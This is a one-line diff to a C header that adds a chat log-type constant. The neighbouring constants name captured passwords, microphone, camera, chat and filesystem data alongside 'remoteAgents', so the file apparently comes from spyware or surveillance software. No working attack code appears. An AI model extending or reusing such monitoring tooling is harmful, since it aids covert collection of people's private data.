@@ -305,6 +305,7 @@ extern u_int remoteAgents[];
 #define LOG_PASSWORD        0xFAFA
 #define LOG_MICROPHONE      0xC2C2
 #define LOG_CHAT            0xC6C6
+#define LOG_CHAT_NEW        0xC6C7
 #define LOG_CAMERA          0xE9E9
 #define LOG_APPLICATION     0x1011
 #define LOG_FILESYSTEM      0xEDA1
